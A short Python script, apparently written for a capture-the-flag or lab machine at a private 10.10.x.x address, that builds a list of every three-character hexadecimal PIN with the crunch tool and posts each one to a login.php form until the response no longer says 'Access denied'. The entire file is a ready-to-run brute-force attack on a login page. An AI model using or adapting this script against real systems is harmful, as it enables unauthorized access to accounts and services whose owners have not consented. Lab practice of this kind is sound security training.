#!/usr/bin/env python3

import requests
from subprocess import Popen

URL = "http://10.10.175.79:8000/login.php"

# Create dictionary
p = Popen(["crunch", "3", "3", "0123456789ABCDEF", "-o", "dictionary.txt"])
p.wait()

# Brute force
with open("dictionary.txt", "r") as f:
    for line in f:
        data = {"pin": line.strip()}
        r = requests.post(URL, data=data)
        if not "Access denied" in r.text:
            print("Found pin: " + line.strip())
            break
